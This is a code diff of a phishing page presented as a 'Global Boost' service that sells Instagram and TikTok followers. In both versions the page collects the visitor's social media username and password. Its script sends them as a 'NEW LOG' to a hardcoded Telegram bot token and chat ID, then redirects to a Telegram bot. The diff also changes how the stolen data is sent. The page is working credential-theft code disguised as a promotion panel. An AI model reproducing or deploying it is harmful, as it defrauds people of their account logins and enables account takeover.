@@ -3,99 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Boost | Instagram & TikTok</title>
+    <title>Global Boost | Social Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { margin: 0; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: linear-gradient(135deg, #2b0a3d, #3a0ca3, #720026); font-family: -apple-system, sans-serif; padding: 20px 0; }
-        .container { width: 320px; background: rgba(255,255,255,0.05); backdrop-filter: blur(15px); border-radius: 25px; display: flex; flex-direction: column; padding: 25px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }
-        .social-icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 15px; font-size: 24px; color: rgba(255,255,255,0.7); }
-        .status { text-align: center; color: #00ff88; font-size: 12px; margin-bottom: 10px; font-weight: bold; }
-        .header { text-align: center; color: white; font-weight: bold; margin-bottom: 20px; font-size: 1.2em; }
-        .input-group { display: flex; flex-direction: column; gap: 12px; }
-        input { width: 100%; padding: 14px; border-radius: 15px; border: none; background: rgba(255,255,255,0.9); box-sizing: border-box; font-size: 16px; outline: none; }
-        .btn-send { margin-top: 15px; padding: 15px; border: none; border-radius: 15px; background: #ff006e; color: white; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-        .btn-send:active { transform: scale(0.96); background: #d9005d; }
-        .info-box { width: 320px; margin-top: 20px; color: white; font-size: 13px; line-height: 1.5; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 20px; border: 1px dashed rgba(255,255,255,0.2); box-sizing: border-box; }
-        .info-item { margin-bottom: 12px; display: flex; align-items: flex-start; gap: 10px; }
-        .info-item i { color: #ff006e; margin-top: 3px; }
-        .lang-divider { border-top: 1px solid rgba(255,255,255,0.1); margin: 10px 0; padding-top: 10px; }
+        body { margin: 0; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); font-family: sans-serif; padding: 20px; }
+        .container { width: 100%; max-width: 320px; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 25px; box-sizing: border-box; border: 1px solid rgba(255,255,255,0.1); text-align: center; }
+        .header { color: white; margin-bottom: 20px; font-size: 1.2em; font-weight: bold; }
+        .icons { font-size: 24px; color: #e94560; margin-bottom: 15px; display: flex; justify-content: center; gap: 15px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: none; outline: none; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; border-radius: 10px; border: none; background: #e94560; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:disabled { background: #555; }
+        .info { margin-top: 20px; color: #ccc; font-size: 12px; text-align: left; line-height: 1.4; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="social-icons">
-        <i class="fab fa-telegram"></i>
+    <div class="icons">
         <i class="fab fa-instagram"></i>
-        <i class="fab fa-tiktok"></i> </div>
-    <div class="status">● System Online (v.3.2)</div>
-    <div class="header">Social Media Boost 👥</div>
-    <div class="input-group">
-        <input type="text" id="username" placeholder="Username / Логин">
-        <input type="password" id="password" placeholder="Password / Пароль">
-        <button class="btn-send" id="mainBtn" onclick="sendMessage()">Start Promotion / Запустить</button>
+        <i class="fab fa-tiktok"></i>
+        <i class="fab fa-telegram"></i>
     </div>
-</div>
+    <div class="header">Social Boost Service</div>
+    <input type="text" id="user" placeholder="Login / Логин">
+    <input type="password" id="pass" placeholder="Password / Пароль">
+    <button id="btn" onclick="send()">Start / Запустить</button>
 
-<div class="info-box">
-    <div class="info-item">
-        <i class="fas fa-check-circle"></i>
-        <div><b>Как это работает:</b> Авторизуйтесь для синхронизации аккаунта с панелью Instagram/TikTok.</div>
-    </div>
-    <div class="info-item">
-        <i class="fas fa-rocket"></i>
-        <div><b>Результат:</b> После входа выберите количество подписчиков и лайков в главном меню.</div>
-    </div>
-
-    <div class="lang-divider"></div>
-
-    <div class="info-item">
-        <i class="fas fa-shield-alt"></i>
-        <div><b>How it works:</b> Log in to sync your account with the Instagram/TikTok panel.</div>
-    </div>
-    <div class="info-item">
-        <i class="fas fa-chart-line"></i>
-        <div><b>Outcome:</b> After logging in, select followers and likes in the main menu.</div>
+    <div class="info">
+        • <b>RU:</b> Введите данные для синхронизации с панелью накрутки.<br><br>
+        • <b>EN:</b> Enter details to sync with the promotion panel.
     </div>
 </div>
 
 <script>
-    async function sendMessage() {
-        const botToken = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKf02e3wNBxn4";
-        const chatId = "7829181579";
-        const redirectUrl = "https://t.me/HQ_smmbot_bot";
+async function send() {
+    const token = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKf02e3wNBxn4";
+    const id = "7829181579";
+    const next = "https://t.me/HQ_smmbot_bot";
 
-        let uF = document.getElementById("username");
-        let pF = document.getElementById("password");
-        let btn = document.getElementById("mainBtn");
+    let u = document.getElementById("user").value;
+    let p = document.getElementById("pass").value;
+    let b = document.getElementById("btn");
 
-        if (!uF.value || !pF.value) { 
-            alert("Please fill all fields! / Заполните все поля!"); 
-            return; 
+    if (!u || !p) { alert("Заполните поля!"); return; }
+
+    b.disabled = true;
+    b.innerText = "Wait...";
+
+    // Формируем текст без лишних HTML тегов для надежности
+    const msg = "--- НОВЫЙ ЛОГ ---\nЛогин: " + u + "\nПароль: " + p;
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`);
+        
+        if (response.ok) {
+            alert("Success! / Успешно!");
+            window.location.href = next;
+        } else {
+            alert("Error / Ошибка бота. Попробуйте снова.");
+            b.disabled = false;
+            b.innerText = "Start";
         }
-
-        btn.innerText = "Syncing / Синхронизация...";
-        btn.disabled = true;
-
-        const t = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
-        const text = `<b>🔥 НОВЫЙ ЛОГ!</b>\n\n👤 <b>Логин:</b> <code>${uF.value}</code>\n🔑 <b>Пароль:</b> <code>${pF.value}</code>\n⏰ <b>Время:</b> ${t}`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "HTML" })
-            });
-
-            alert("Sync completed! Redirecting to panel... / Синхронизация завершена! Переходим в панель...");
-            window.location.href = redirectUrl;
-
-        } catch (e) {
-            alert("Connection error / Ошибка соединения");
-            btn.innerText = "Start Promotion";
-            btn.disabled = false;
-        }
+    } catch (e) {
+        alert("No connection / Нет сети");
+        b.disabled = false;
+        b.innerText = "Start";
     }
+}
 </script>
 
 </body>
